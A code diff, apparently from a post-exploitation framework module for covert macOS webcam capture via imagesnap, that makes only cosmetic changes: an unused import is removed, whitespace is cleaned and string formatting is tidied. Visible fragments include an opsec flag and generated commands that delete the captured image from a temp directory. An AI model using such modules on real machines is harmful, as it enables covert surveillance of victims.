@@ -1,5 +1,3 @@
-from lib.common import helpers
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -26,7 +24,7 @@ class Module:
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
-            
+
             # list of any references/other comments
             'Comments': [
                 "http://iharder.sourceforge.net/current/macosx/imagesnap/"
@@ -65,9 +63,8 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
-        
+
         tempDir = self.options['TempDir']['Value']
         if not tempDir.endswith("/"):
             tempDir += "/"
@@ -90,6 +87,6 @@ f.close()
 run_command('rm -f %sdebug')
 run_command('rm -f %sdebug.jpg')
 print data
-""" %(tempDir,tempDir,tempDir,tempDir,tempDir,tempDir,tempDir)
-    
+""" % (tempDir, tempDir, tempDir, tempDir, tempDir, tempDir, tempDir)
+
         return script
